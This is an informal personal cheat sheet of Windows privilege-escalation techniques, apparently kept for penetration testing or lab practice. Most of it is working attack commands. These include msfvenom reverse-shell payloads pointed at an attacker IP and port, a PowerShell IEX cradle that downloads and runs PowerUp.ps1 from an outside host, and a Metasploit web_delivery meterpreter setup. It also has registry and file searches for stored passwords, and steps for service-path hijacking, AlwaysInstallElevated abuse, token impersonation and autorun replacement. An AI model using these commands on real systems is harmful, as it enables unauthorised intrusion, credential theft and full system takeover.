<h2> Seatbelt </h2><br>
Priv esc tool called seatbelt (in my linux downloads) <br>
get onto target and run, will show memory creds -- look for outpit CredEnum and WindowsVault, if an account shows here and you can use RDP on the machine run <br>
runas /savecred /user:<user> /profile "cmd.exe"
  <br>

<h2>useful notes on scripts </h2>
To run a powershell script, cmd to the directory the script is in and type . .\nameofscript.ps1 (may also need to import modules google the script)<br>
useful priv esc check script for windows is PowerUp.ps1 use the Invoke-Allchecks  <br>
aka -- . .\PowerUp.ps1 <br>
Invoke-AllChecks <br>
tool Accesschk should be downloaded and used to see permissions on services etc <br>
<br>
<h1>Windows Priv esc learning</h1>
First run whoami /priv to see account privilages or gpresult /v <br>
Check privilges against exploits listed here -- https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md#eop---impersonation-privileges <br>

<h2> JuicyPotato </h2> <br>
If a user has SEImpersonate privilage or SeAssignPrimaryToken can try priv esc with juicy potato (usually service accounts have this set). <br>
Can use Windowsexploitsuggestor.py, copy systeminfo output from a machine (type systeminfo on cmd) then paste into python windows exploit suggestor (doesnt work on my machine). <br>
<br>
To get exploit onto machine, open a web delivery meterpreter shell via MSFCONSOLE -- type exploit /multi/script/web_delivery. Change payload to meterpreter reverse_tcp. Set lhost and all that lovely stuff and change exploit target to powershell (if on windows). This will now give reverse shell output to run on the comprimised machine. Paste onto comprimised machine. <br>
Back on msfconsole type -- sessions 1 <br>
Could now type -- run /post/multi/recon/local_exploit_suggestor, use exploits suggested. 

<h2>pre requists </h2>
Move Powerview.ps1 to machine and invoke all checks <br>

<h3>If on a box check perms and check other users</h3>
whoami /priv
whoami /groups
net user
whoami /all
Get-LocalUser | ft Name,Enabled,LastLogon
Get-ChildItem C:\Users -Force | select Name

<h3>List shares</h3>
net share
powershell Find-DomainShare -ComputerDomain domain.local

<h3>Find passwords</h3> <br>
Powershell cred history - cat (Get-PSReadlineOption).HistorySavePath | sls passw <br>
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*

<h3>Find certain files</h3>
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini


<h3>Search the registry for key names and passwords</h3>
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s
<br>

<h2> Run As </h2> <br>
On CMD type <br>
cmdkey /list (look for any saved creds listed and download tool runas <br>
Create reverse shell msfvenom payload and move to victim machine, start listener <br>
runas /savecred /user:adduser  C:\path\to\msfvenomshell <br>

<h3>Passwords in unattend.xml</h3>
Location of the unattend.xml files.

C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

<h2> default writeable shares </h2>
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp

<h2>Autoruns</h2>
run ---- either of the below
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"

can get a tool called autoruns - will show programs that automatically run which if writeable can create reverse shell
from msfconsole and replace program


<h2>Checking install elevated </h2>
Type - reg query HKLM\Software\Policies\Microsoft\Windows\Installer (this is a direct policy path it can change
per software)
notice that “AlwaysInstallElevated” value is 1.
Geberate reverse shell exe with msfvenom and setup a listener
msiexec /quiet /qn /i /pathtosoftwarecreated

<h2>unquoted service paths</h2>
Run winpeas and check for any unquoted service paths <br>
Can try move powerview to the machine and run powerview or powerup.ps1 - Invoke-AllChecks. PowerView.ps1 - Get-ServiceUnquoted (see below command).<br>
Run http server on PowerSploit directory on my linux. Type command on victim <br> 
powershell -nop -exec bypass -c "IEX(New-Object Net.WebClient).DownloadString('http://192.168.0.81/PowerUp.ps1');Get-ServiceUnquoted" (change IP) <br>
if winpeas wont work try run <br>
wmic service get name,displayname,pathname,startmode |findstr /i "Auto" |findstr /i /v "C:\Windows\\" |findstr /i /v """ <br>
for example if path -- C:\Program Files\unquoted path\Common Files <br>
Ensure you can stop and start service you are attacking -- sc query servicename (also check if runs as localsystem)<br>
create exe - common.exe  -- msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.7.84 LPORT=4242 -f exe -o reverse3.exe <br>
place in C:\Program Files\unquoted path (this ovbiously changes path for what you found) <br>
call service   -- sc start servicename <br>
you change change whats in the generated exe  <br>
<br>
Another way, if you find the unquoted service that runs as localsystem C:\test\Program Files\New exe\service.exe <br>
Looking to see if you have read write to any directories list above, say access to write to program Files <br>
create reverse shell exe and call it New.exe, now the service is going to look C:\test\Program Files\New.exe <br>
<create listener <br>
restart the service, if you have no permissions and its set to autorun, reboot the system <br>
<br>

<h2> service path binaries </h2> <br>
Check unquoted service paths with powerup (download to machine run powershell and do . ./PowerUp.ps1 then run Get-ServiceUnquoted <br>
Query highlighted services with accesschk -- C:\PrivEsc\accesschk.exe /accepteula -uwcqv user daclsvc (change path to where download is and change "daclsv" to service name) <br>
Now query service with sc qc servicename (see who the service runs as and if permission to stop start). Look at binary path name, can you browse to the path and replace the path for the service? <br>
Create new reverse shell msfvenom payload <br>
sc config daclsvc binpath= "\"C:\PrivEsc\reverse.exe\""   (change "daclsvc" to service name and binary path to place where generated msfvenom payload rs is) <br>
<br>
Start service again -- net start servicename <br>
<br>
<h2>search configuration files for passwords</h2>
<br>
<h2> RunAs </h2> <br>
If you have a meterpreter shell, try the command getsystem <br>
<br>

<h2> Auto Runs (does require admin already for admin shell, can use to create meterpreter shell </h2>
autorunsc.exe -m -nobanner -a * -ct /accepteula <br>
Winpeas will also check <br>
Download autorun to machine, Run on cmd -- C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe (change path to where installed) <br>
Have a look what programs auto run and where they point too <br>
Now download Accesschk on pc, navigate to via cmd <br>
C:\Users\User\Desktop\path\to\accesschk64.exe -wvu "C:\Programs\path of program that autoruns" <br>
see if everyone has access all rights <br>
generate new reverse shell with msfvenom linking listener to attacker IP<br>
start new multi handler with metasploit and setup listner <br>
Replace autorun file with malicious generated file <br>
logout and back in <br>


<h2>kernel exploits</h2>
if established session with MSFCONSOLE while sessions is established type
run post/multi/recon/local_exploit_suggester
identify vulnerability and type
use exploitname
set SESSION [meterpreter SESSION number]
set LPORT
run

<h2> Scheduled Tasks</h2>
View tasks --- schtasks /query /fo LIST /v 
tasklist /v /fi "username eq system"

AccessChk is a command-line tool for viewing the effective permissions on files, registry keys, services, processes, kernel objects, and more. This tool will be helpful to identify whether the current user can modify the script
download here ---- https://github.com/ankh2054/windows-pentest
bypass EULA -- .\accesschk.exe /accepteula -quvw userofscheduledtaskcheckingpermission C:\Users\Administrator\Desktop\taskfilelocation
e.g --- .\accesschk.exe /accepteula -quvw stef C:\Users\Administrator\Desktop\Backup.ps1
create msfvenom shell and transfer over to victim machine
echo path_to_shell >> path_to_scheduled_script
setup listener <br>
<br>
<h2>Further processes to check </h2> <br>
https://www.roguesecurity.in/2018/12/02/a-guide-for-windows-penetration-testing/
<br>
<h2>tokens</h2>
If you have an account that can login via ssh or psexec, or can get a meterpreter shell (use payload meterpreter), if a DA has had a session on the machine, type when in  meterpreter shell list_tokens, see if admin token is listed. If so type impersonate_token domain\\username, now run "shell" to drop into shell. <br> If account has domain privilages run mimikatz to dump, look in AD section.
<br>
<br>
<h2> RegSVC Esculation </h2><br>
google this <br>
<br>

<h2> EXE files as a service </h2><br>
Download Accesschk <br>
On a service that has an exe that executes (can find this with powerup Invoke-AllChecks and check if this runs as LocalSystem) <br>
run Accesschk against the service path exe -- C:\Users\path\to\accesschk\accesschk64.exe -wvu "C:\path\to\service\exe" <br>
Look if there are any permissions such as RW everyone FILE_ALL_ACCESS <br>
Create msfvenom reverse shell and overwrite exe file in service location identified above. <br>
start the service -- sc start servicename <br>
<br>

<h2> Start Up Applications </h2> <br>
use a tool called icacls.exe (assess ACLs) <br>
use icacls on the program startup directory --- icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" <br>
Have a look if the username or BUILTIN\Users has full access (F) or Write access (W) to the directory <br>
Generate a malicious file with msfvenom and set the listener. <br>
add the payload to the directory and reboot the machine <br>
<br>

<h2> DLL Hijacking </h2><br>
DLL are shared libaries, containing classes, functions and resources, often run with exes <br>
When windows starts a service or application it looks for dll's, if this doesnt exist then can be exploited. <br>




